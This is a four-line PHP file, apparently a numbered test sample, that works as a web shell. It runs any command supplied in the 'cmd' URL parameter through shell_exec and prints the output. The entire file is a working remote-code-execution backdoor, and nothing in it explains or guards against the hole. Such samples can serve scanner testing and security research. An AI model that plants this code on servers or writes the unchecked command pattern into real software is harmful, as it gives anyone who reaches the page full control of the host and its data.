<?php
// RCE test variation #1139
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>